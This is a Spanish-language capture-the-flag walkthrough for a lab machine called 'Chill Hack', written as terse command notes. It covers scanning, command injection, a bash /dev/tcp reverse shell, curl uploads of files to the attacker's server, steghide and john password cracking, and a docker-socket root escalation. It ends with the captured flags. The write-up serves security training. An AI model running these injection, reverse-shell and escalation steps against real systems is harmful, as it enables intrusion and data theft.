# Chill Hack

## Escaneo

```
# Nmap 7.80 scan initiated Thu Nov 26 17:27:05 2020 as: nmap -v -sC -sV -oN nmap 10.10.190.7
Nmap scan report for 10.10.190.7
Host is up (0.22s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.6.113
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 26 17:27:39 2020 -- 1 IP address (1 host up) scanned in 34.25 seconds
```


## Directorios
````
dir -u http://10.10.190.7 -w /tools/wordlists/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.190.7
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /tools/wordlists/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2020/11/26 17:34:18 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 308] [--> http://10.10.190.7/css/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.190.7/fonts/]
/images               (Status: 301) [Size: 311] [--> http://10.10.190.7/images/]
/index.html           (Status: 200) [Size: 35184]                               
/js                   (Status: 301) [Size: 307] [--> http://10.10.190.7/js/]    
/secret               (Status: 301) [Size: 311] [--> http://10.10.190.7/secret/]
/server-status        (Status: 403) [Size: 276]                                 
                                                                                
===============================================================
2020/11/26 17:36:26 Finished
===============================================================
````

## Shell inicial

### Inyeccion de comandos /secret

```
curl -X POST http://10.10.190.7/secret/ -d "command=ls;ls"
<html>
<body>

<form method="POST">
        <input id="comm" type="text" name="command" placeholder="Command">
        <button>Execute</button>
</form>
<h2 style="color:blue;">images
index.php
images
index.php
</h2>
                        <style>
                             body
                             {
                                   background-image: url('images/blue_boy_typing_nothought.gif');  
                                   background-position: center center;
                                   background-repeat: no-repeat;
                                   background-attachment: fixed;
                                   background-size: cover;
}
                          </style>
        </body>
</html>
```

## Reverse shell

### Codificar el URL con jq

```
jq -nr --arg v "ls;bash -c 'bash -i >& /dev/tcp/10.13.6.113/1234 0>&1'" '$v|@uri'
ls%3Bbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.13.6.113%2F1234%200%3E%261'
```

### Ejecutar el shell

 curl -X POST http://10.10.82.73/secret/ -d "command=ls%3Bbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.13.6.113%2F1234%200%3E%261'"

### Escucharlo del otro lado

```
 nc -lnvp 1234
Listening on 0.0.0.0 1234

Connection received on 10.10.82.73 49148
bash: cannot set terminal process group (1002): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/secret$ 
www-data@ubuntu:/var/www/html/secret$ 
```

## Obtener usuario

```
www-data@ubuntu:/tmp$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```
- Al parecer lo que hay que hacer es modificar .helpline.sh y ejecutarlo como sudo


- Ejecutar el comando con sudo y poner como mensaje /bin/bash
```
su - apaar -c /home/apaar/.helpline.sh
sudo -u apaar /home/apaar/.helpline.sh
Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: root
root
Hello user! I am root,  Please enter your message: /bin/bash
/bin/bash
id
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
```
- Mostramos la bandera de user:
```
cat local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

- subir las imagenes encontradas a nuestro servidor webdav
```
cd /var/www/html/secret/images

curl -T FailingMiserableEwe-size_restricted.gif http://10.13.6.113/FailingMiserableEwe-size_restricted.gif

curl -T blue_boy_typing_nothought.gif http://10.13.6.113/blue_boy_typing_nothought.gif
```
- aca hay mas
```
/var/www/files
cd images
ls -la
total 2112
drwxr-xr-x 2 root root    4096 Oct  3 06:30 .
drwxr-xr-x 3 root root    4096 Oct  3 04:40 ..
-rw-r--r-- 1 root root 2083694 Oct  3 04:03 002d7e638fb463fb7a266f5ffc7ac47d.gif
-rw-r--r-- 1 root root   68841 Oct  3 04:24 hacker-with-laptop_23-2147985341.jpg
curl -T hacker-with-laptop_23-2147985341.jpg http://10.13.6.113/hacker-with-laptop_23-2147985341.jpg```
```
- revisamos localmente por stego
```
steghide extract -sf hacker-with-laptop_23-2147985341.jpg 
Enter passphrase: 
wrote extracted data to "backup.zip".
➜  /tmp unizip backup.zip 
zsh: command not found: unizip
➜  /tmp unzip backup.zip 
Archive:  backup.zip
[backup.zip] source_code.php password: 
   skipping: source_code.php         incorrect password
```

- sacamos la llave del zip
```
john hash -w=/tools/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pass1word        (backup.zip/source_code.php)     
1g 0:00:00:00 DONE (2020-11-27 19:33) 33.33g/s 546133p/s 546133c/s 546133C/s toodles..christal
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
➜  /tmp 
```
- cadena base64 encontrada en el php del backup.zip
```
  echo 'IWQwbnRLbjB3bVlwQHNzdzByZA==' | base64 -d
!d0ntKn0wmYp@ssw0rd
```

- buscamos para que usuario nos puede servir
```
cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
aurick:x:1000:1000:Anurodh:/home/aurick:/bin/bash
apaar:x:1001:1001:,,,:/home/apaar:/bin/bash
anurodh:x:1002:1002:,,,:/home/anurodh:/bin/bash
```
- al final fue anurodh, entramos por ssh
```
ssh anurodh@10.10.33.189 
```

- hay un socket de docker del que se puede abusar
```
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash
root@809e2e4f2654:/# cd root
root@809e2e4f2654:~# ls
proof.txt
root@809e2e4f2654:~# cat proof.txt


                                        {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
```
